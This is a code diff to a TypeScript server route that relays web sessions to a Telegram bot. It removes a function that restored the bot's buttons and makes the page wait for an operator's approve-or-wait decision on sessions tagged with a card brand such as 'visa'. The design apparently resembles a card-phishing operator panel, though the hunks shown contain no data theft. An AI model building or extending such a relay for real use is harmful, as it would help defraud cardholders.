@@ -316,16 +316,6 @@ function rememberMessageTarget(sessionId: string, callback: Record<string, unkno
   session.lastTelegramMessageId = message.message_id;
 }
 
-async function restoreTelegramKeyboard(sessionId: string, brand: string) {
-  const session = getSession(sessionId);
-  if (session.lastTelegramChatId == null || typeof session.lastTelegramMessageId !== 'number') return;
-  await telegramApi('editMessageReplyMarkup', {
-    chat_id: session.lastTelegramChatId,
-    message_id: session.lastTelegramMessageId,
-    reply_markup: keyboard(sessionId, brand || 'visa'),
-  });
-}
-
 async function sendTelegram(payload: Record<string, unknown>, options: { withButtons?: boolean } = {}) {
   const { chatId } = telegramConfig();
   if (!chatId) return { sent: false, skipped: 'telegram-env-missing' };
@@ -382,7 +372,7 @@ async function answerTelegramCallback(callbackId: unknown) {
   return { answered: result.ok, skipped: false, description: result.description };
 }
 
-// Procesa un clic: responde YA, guarda la decision y deja los 3 botones hasta Finalizar.
+// Procesa un clic: responde YA, quita los botones y espera la respuesta de la pagina.
 async function handleTelegramCallback(body: Record<string, unknown>) {
   const callback = (body.callback_query || body) as Record<string, unknown> | undefined;
   const source = (callback && typeof callback === 'object' && 'data' in callback ? callback : {}) as Record<string, unknown>;
@@ -449,12 +439,8 @@ export const GET: APIRoute = async ({ url }) => {
   if (decision.action && decision.action !== 'wait') {
     const latest = await restoreRouteState(sessionId);
     if (!latest || latest.callbackId === (packed?.callbackId || session.lastCallbackId)) {
-      const delivered = decision.action;
       session.decision = { action: 'wait', brand: decision.brand, updatedAt: new Date().toISOString() };
       await persistRouteState(sessionId, session.decision, packed?.callbackId || session.lastCallbackId || '');
-      if (delivered !== 'approved') {
-        await restoreTelegramKeyboard(sessionId, String(decision.brand || packed?.brand || 'visa'));
-      }
     }
   }
   return json({ sessionId, decision });
